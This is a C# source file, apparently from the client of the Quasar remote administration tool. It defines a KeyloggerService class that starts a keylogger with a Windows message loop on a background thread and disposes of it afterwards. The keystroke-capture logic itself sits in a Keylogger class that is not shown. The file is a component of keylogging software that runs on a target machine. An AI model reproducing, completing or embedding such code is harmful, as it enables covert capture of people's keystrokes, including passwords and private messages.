using System;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Logging
{
    /// <summary>
    /// Provides a service to run the keylogger.
    /// </summary>
    public class KeyloggerService : IDisposable
    {
        /// <summary>
        /// The thread containing the executed keylogger and message loop.
        /// </summary>
        private readonly Thread _msgLoopThread;
        
        /// <summary>
        /// The message loop which is needed to receive key events.
        /// </summary>
        private ApplicationContext _msgLoop;
        
        /// <summary>
        /// Provides keylogging functionality.
        /// </summary>
        private Keylogger _keylogger;

        /// <summary>
        /// Initializes a new instance of <see cref="KeyloggerService"/>.
        /// </summary>
        public KeyloggerService()
        {
            _msgLoopThread = new Thread(() =>
            {
                _msgLoop = new ApplicationContext();
                _keylogger = new Keylogger(15000, 5 * 1024 * 1024);
                _keylogger.Start();
                Application.Run(_msgLoop);
            });
        }

        /// <summary>
        /// Starts the keylogger and message loop.
        /// </summary>
        public void Start()
        {
            _msgLoopThread.Start();
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this keylogger service.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected void Dispose(bool disposing)
        {
            if (disposing)
            {
                _keylogger.Dispose();
                _msgLoop.ExitThread();
                _msgLoop.Dispose();
            }
        }
    }
}
